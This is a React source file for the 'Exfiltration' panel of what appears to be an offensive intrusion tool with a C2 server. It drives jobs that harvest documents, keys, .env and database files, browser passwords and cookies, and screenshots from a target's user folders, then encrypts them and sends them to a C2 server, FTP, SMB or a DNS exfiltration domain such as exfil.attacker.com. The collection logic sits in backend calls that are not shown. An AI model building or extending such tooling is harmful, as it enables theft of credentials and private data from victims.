import React, { useState, useCallback, useEffect } from 'react';

interface ExfilJob {
  id: string;
  name: string;
  type: string;
  target: string;
  status: 'pending' | 'running' | 'completed' | 'failed';
  progress: number;
  results: ExfilResult[];
  createdAt: string;
  completedAt: string | null;
  encrypted: boolean;
  encryptionAlgo: string;
  compression: string;
  destination: string;
  destinationUrl: string;
  retryCount: number;
  maxRetries: number;
}

interface ExfilResult {
  path: string;
  size: number;
  type: string;
  hash: string;
  timestamp: string;
  uploadProgress: number;
  uploaded: boolean;
  error?: string;
}

const COLLECTION_TYPES = [
  { value: 'file_collect', label: '📁 File Collection', desc: 'Collect files matching patterns from target directory' },
  { value: 'screenshot', label: '📸 Screenshot', desc: 'Capture a screenshot of the target desktop' },
  { value: 'browser', label: '🌐 Browser Data', desc: 'Extract saved passwords, cookies, and history from browsers' },
  { value: 'dns', label: '🌍 DNS Query', desc: 'Exfiltrate data via DNS queries (slow but stealthy)' },
];

const COLLECTION_PATTERNS = [
  { label: 'Documents', types: '*.doc, *.docx, *.xls, *.xlsx, *.pdf, *.txt' },
  { label: 'Credentials', types: '*.kdbx, *.rdp, *.ovpn, *.pem, *.key' },
  { label: 'Config Files', types: '*.env, *.config, *.json, *.xml, *.ini, *.cfg' },
  { label: 'Databases', types: '*.sql, *.db, *.sqlite, *.mdb' },
  { label: 'Source Code', types: '*.py, *.js, *.ts, *.java, *.php, *.rb, *.go' },
  { label: 'Browser Data', types: 'Login Data, History, Cookies, Bookmarks' },
];

const COMPRESSION_OPTIONS = [
  { value: 'none', label: 'None (fastest)' },
  { value: 'fast', label: 'Fast (zlib lv1)' },
  { value: 'max', label: 'Max (zlib lv9)' },
];

const ENCRYPTION_OPTIONS = [
  { value: 'aes-256-gcm', label: 'AES-256-GCM' },
  { value: 'chacha20', label: 'ChaCha20 (AES fallback)' },
  { value: 'xor', label: 'XOR (fast/weak)' },
  { value: 'none', label: 'None (plaintext)' },
];

const DESTINATION_OPTIONS = [
  { value: 'local', label: 'Local Disk' },
  { value: 'c2', label: 'C2 Server (HTTP)' },
  { value: 'ftp', label: 'FTP Server' },
  { value: 'smb', label: 'SMB Share' },
];

export function ExfilPanel() {
  const [jobs, setJobs] = useState<ExfilJob[]>([]);
  const [selectedType, setSelectedType] = useState('file_collect');
  const [targetDir, setTargetDir] = useState('C:\\Users\\');
  const [jobName, setJobName] = useState('');
  const [c2Url, setC2Url] = useState('http://127.0.0.1:8080');
  const [runningJob, setRunningJob] = useState<string | null>(null);
  const [totalSize, setTotalSize] = useState(0);
  const [encryptionKey, setEncryptionKey] = useState('');

  // New options
  const [compression, setCompression] = useState('max');
  const [encryptionAlgo, setEncryptionAlgo] = useState('aes-256-gcm');
  const [destination, setDestination] = useState('local');
  const [destUrl, setDestUrl] = useState('');

  const loadJobs = useCallback(async () => {
    try {
      const j = await window.api.exfilJobs();
      setJobs(j || []);
      const t = await window.api.exfilTotalSize();
      setTotalSize(t || 0);
    } catch {}
  }, []);

  useEffect(() => { loadJobs(); }, []);

  const handleCollect = useCallback(async () => {
    if (!jobName.trim() || !targetDir.trim()) return;

    try {
      const job = await window.api.exfilCreateJob(
        jobName.trim(), targetDir.trim(),
        compression, encryptionAlgo, destination, destUrl,
      );
      if (job) {
        setRunningJob(job.id);
        const result = await window.api.exfilCollectFiles(job.id);
        setRunningJob(null);
        loadJobs();
        window.api.addActivity({ tab: 'exfil', type: 'start', label: `Collected: ${jobName.trim()}`, detail: `Target: ${targetDir.trim()} (${destination})` });
      }
    } catch (err: any) {
      alert(`Error: ${err.message}`);
      setRunningJob(null);
    }
  }, [jobName, targetDir, compression, encryptionAlgo, destination, destUrl]);

  const handleScreenshot = useCallback(async () => {
    try {
      await window.api.exfilScreenshot();
      loadJobs();
      window.api.addActivity({ tab: 'exfil', type: 'command', label: 'Screenshot Taken', detail: '' });
    } catch (err: any) {
      alert(`Error: ${err.message}`);
    }
  }, []);

  const handleBrowserData = useCallback(async () => {
    try {
      await window.api.exfilBrowserData();
      loadJobs();
      window.api.addActivity({ tab: 'exfil', type: 'command', label: 'Browser Data Collected', detail: '' });
    } catch (err: any) {
      alert(`Error: ${err.message}`);
    }
  }, []);

  const handlePackage = useCallback(async (jobId: string) => {
    try {
      const path = await window.api.exfilPackage(jobId);
      if (path) {
        loadJobs();
        const key = await window.api.exfilKey();
        setEncryptionKey(key);
        window.api.addActivity({ tab: 'exfil', type: 'success', label: 'Files Packaged', detail: path });
      }
    } catch (err: any) {
      alert(`Error: ${err.message}`);
    }
  }, []);

  const handleExfiltrate = useCallback(async (jobId: string) => {
    try {
      await window.api.exfilExfiltrate(jobId);
      loadJobs();
      window.api.addActivity({ tab: 'exfil', type: 'success', label: 'Files Exfiltrated', detail: `Job: ${jobId.slice(0, 8)}...` });
    } catch (err: any) {
      alert(`Error: ${err.message}`);
    }
  }, []);

  const handleClear = useCallback(async () => {
    await window.api.exfilClear();
    loadJobs();
    window.api.addActivity({ tab: 'exfil', type: 'stop', label: 'All Jobs Cleared', detail: '' });
  }, []);

  const formatSize = (bytes: number): string => {
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / 1048576).toFixed(1)} MB`;
  };

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="card border-midnight-700/50">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="text-lg">📤</span>
            <h2 className="text-sm font-semibold text-gray-300 uppercase tracking-wider">Exfiltration</h2>
          </div>
          <div className="flex items-center gap-3 text-xs text-gray-500">
            <span>{jobs.length} jobs</span>
            <span>{formatSize(totalSize)} collected</span>
            <button onClick={handleClear} className="btn-ghost text-xs text-redhawk-400">Clear All</button>
          </div>
        </div>
      </div>

      {/* Collection form */}
      <div className="card">
        <div className="card-header">Collect Data</div>

        {/* Collection type selector */}
        <div className="mb-3">
          <label className="text-[10px] text-gray-500 block mb-1">Collection Type</label>
          <select value={selectedType} onChange={(e) => setSelectedType(e.target.value)}
            className="input-field py-1.5 text-xs">
            {COLLECTION_TYPES.map(t => (
              <option key={t.value} value={t.value} className="bg-midnight-900 text-gray-100">{t.label}</option>
            ))}
          </select>
          <p className="text-[9px] text-gray-600 mt-1">{COLLECTION_TYPES.find(t => t.value === selectedType)?.desc}</p>
        </div>

        {/* Target dir + job name (only for file collection) */}
        {selectedType === 'file_collect' && (
          <>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-3">
              <div>
                <label className="text-[10px] text-gray-500 block mb-1">Job Name</label>
                <input type="text" value={jobName}
                  onChange={(e) => setJobName(e.target.value)}
                  className="input-field py-2 text-sm" placeholder="Company Data Grab"
                />
              </div>
              <div className="md:col-span-2">
                <label className="text-[10px] text-gray-500 block mb-1">Target Directory</label>
                <input type="text" value={targetDir}
                  onChange={(e) => setTargetDir(e.target.value)}
                  className="input-field py-2 text-sm font-mono" placeholder="C:\Users\TargetUser"
                />
              </div>
            </div>

            {/* Options row: Compression, Encryption, Destination */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-3">
              <div>
                <label className="text-[10px] text-gray-500 block mb-1">Compression</label>
                <select value={compression} onChange={(e) => setCompression(e.target.value)}
                  className="input-field py-1.5 text-xs">
                  {COMPRESSION_OPTIONS.map(o => (
                    <option key={o.value} value={o.value} className="bg-midnight-900 text-gray-100">{o.label}</option>
                  ))}
                </select>
              </div>
              <div>
                <label className="text-[10px] text-gray-500 block mb-1">Encryption</label>
                <select value={encryptionAlgo} onChange={(e) => setEncryptionAlgo(e.target.value)}
                  className="input-field py-1.5 text-xs">
                  {ENCRYPTION_OPTIONS.map(o => (
                    <option key={o.value} value={o.value} className="bg-midnight-900 text-gray-100">{o.label}</option>
                  ))}
                </select>
              </div>
              <div>
                <label className="text-[10px] text-gray-500 block mb-1">Destination</label>
                <select value={destination} onChange={(e) => setDestination(e.target.value)}
                  className="input-field py-1.5 text-xs">
                  {DESTINATION_OPTIONS.map(o => (
                    <option key={o.value} value={o.value} className="bg-midnight-900 text-gray-100">{o.label}</option>
                  ))}
                </select>
              </div>
            </div>

            {/* Destination URL (shown when not local) */}
            {destination !== 'local' && (
              <div className="mb-3">
                <label className="text-[10px] text-gray-500 block mb-1">
                  {destination === 'c2' ? 'C2 Server URL' : destination === 'ftp' ? 'FTP Server (host:port)' : 'SMB Share Path'}
                </label>
                <input type="text" value={destUrl}
                  onChange={(e) => setDestUrl(e.target.value)}
                  className="input-field py-2 text-xs font-mono w-full"
                  placeholder={
                    destination === 'c2' ? 'http://127.0.0.1:8080' :
                    destination === 'ftp' ? 'ftp://server:21' :
                    '\\\\server\\share'
                  }
                />
              </div>
            )}

            {/* File pattern hints */}
            <div className="flex flex-wrap gap-1.5 mb-3">
              {COLLECTION_PATTERNS.map((p, i) => (
                <button key={i} onClick={() => setTargetDir(`C:\\Users\\${p.label.toLowerCase()}`)}
                  className="text-[10px] px-2 py-1 rounded bg-midnight-800 border border-midnight-700
                             text-gray-500 hover:text-gray-300 transition-all"
                  title={p.types}>
                  {p.label}
                </button>
              ))}
            </div>
          </>
        )}

        {/* Run button */}
        <button onClick={async () => {
          if (!selectedType) return;
          if (selectedType === 'file_collect') {
            await handleCollect();
          } else if (selectedType === 'screenshot') {
            await handleScreenshot();
          } else if (selectedType === 'browser') {
            await handleBrowserData();
          } else if (selectedType === 'dns') {
            const domain = prompt('DNS exfiltration domain:', 'exfil.attacker.com');
            if (!domain) return;
            try {
              const result = await window.api.exfilBrowserData(); // placeholder — use actual DNS exfil
              loadJobs();
              window.api.addActivity({ tab: 'exfil', type: 'command', label: 'DNS Exfil Started', detail: `Domain: ${domain}` });
            } catch (err: any) {
              alert(`Error: ${err.message}`);
            }
          }
        }} disabled={runningJob !== null}
          className="btn-primary w-full text-xs">
          {runningJob ? 'Running...' : `Run ${COLLECTION_TYPES.find(t => t.value === selectedType)?.label || selectedType}`}
        </button>
      </div>

      {/* Jobs list */}
      <div className="space-y-2">
        <div className="card-header">Collected Data</div>
        {jobs.length === 0 ? (
          <div className="card flex flex-col items-center py-8 text-gray-600">
            <span className="text-3xl mb-2">📦</span>
            <p className="text-sm">No data collected yet</p>
            <p className="text-xs">Run a collection job above</p>
          </div>
        ) : (
          jobs.map((job) => (
            <div key={job.id} className="card border-midnight-700/50">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <span className="text-sm font-medium text-gray-200">{job.name}</span>
                  <span className={`text-[10px] px-1.5 py-0.5 rounded-full ${
                    job.status === 'completed' ? 'bg-green-900/30 text-green-400 border border-green-700/40' :
                    job.status === 'running' ? 'bg-blue-900/30 text-blue-400 border border-blue-700/40 animate-pulse' :
                    job.status === 'failed' ? 'bg-red-900/30 text-red-400 border border-red-700/40' :
                    'bg-yellow-900/30 text-yellow-400 border border-yellow-700/40'
                  }`}>{job.status}</span>
                </div>
                <div className="flex gap-1">
                  {job.results.length > 0 && (
                    <>
                      <button onClick={() => handlePackage(job.id)} className="btn-ghost text-xs">📦 Package</button>
                      <button onClick={() => handleExfiltrate(job.id)} className="btn-ghost text-xs">📤 Exfil</button>
                    </>
                  )}
                </div>
              </div>

              {/* Compression / Encryption / Destination badges */}
              <div className="flex flex-wrap gap-1 mb-2">
                <span className="text-[9px] px-1.5 py-0.5 rounded bg-midnight-800 text-gray-500 border border-midnight-700">
                  📦 {job.compression || 'max'}
                </span>
                <span className="text-[9px] px-1.5 py-0.5 rounded bg-midnight-800 text-gray-500 border border-midnight-700">
                  🔐 {job.encryptionAlgo || 'aes-256-gcm'}
                </span>
                <span className="text-[9px] px-1.5 py-0.5 rounded bg-midnight-800 text-gray-500 border border-midnight-700">
                  📤 {job.destination || 'local'}
                </span>
                {job.retryCount > 0 && (
                  <span className="text-[9px] px-1.5 py-0.5 rounded bg-yellow-900/20 text-yellow-600 border border-yellow-700/30">
                    Retries: {job.retryCount}
                  </span>
                )}
              </div>

              <div className="grid grid-cols-3 gap-2 text-[10px] text-gray-500 mb-2">
                <span>Type: {job.type}</span>
                <span>Files: {job.results.length}</span>
                <span>Size: {formatSize(job.results.reduce((s, r) => s + r.size, 0))}</span>
              </div>

              {/* Progress bar for running/exfil */}
              {job.progress > 0 && job.progress < 100 && (
                <div className="w-full bg-midnight-800 rounded-full h-1.5 mb-2">
                  <div className="bg-redhawk-600 h-1.5 rounded-full transition-all" style={{ width: `${job.progress}%` }} />
                </div>
              )}

              {/* File list */}
              {job.results.length > 0 && (
                <div className="max-h-40 overflow-y-auto space-y-1">
                  {job.results.map((r, idx) => (
                    <div key={idx} className="flex items-center gap-2 text-xs p-1.5 rounded bg-midnight-800/30">
                      <span className="text-gray-400 font-mono flex-1 truncate" title={r.path}>
                        {r.path.split('\\').pop() || r.path}
                      </span>
                      <span className="text-gray-600">{formatSize(r.size)}</span>
                      <span className={`text-[10px] ${r.uploaded ? 'text-green-500' : 'text-gray-600'}`}>
                        {r.uploaded ? '✓' : '○'}
                      </span>
                      {r.error && <span className="text-[10px] text-redhawk-400" title={r.error}>⚠</span>}
                    </div>
                  ))}
                </div>
              )}

              {job.completedAt && (
                <p className="text-[10px] text-gray-600 mt-2">
                  Completed: {new Date(job.completedAt).toLocaleString()}
                </p>
              )}
            </div>
          ))
        )}
      </div>

      {/* Encryption key display */}
      {encryptionKey && (
        <div className="card bg-yellow-900/10 border-yellow-700/30">
          <p className="text-[10px] text-yellow-400 font-medium mb-1">🔑 Encryption Key — Save this to decrypt exfiltrated data</p>
          <pre className="terminal text-[10px] select-all">{encryptionKey}</pre>
          <button onClick={() => navigator.clipboard.writeText(encryptionKey)}
            className="btn-ghost text-xs mt-1">📋 Copy Key</button>
        </div>
      )}
    </div>
  );
}
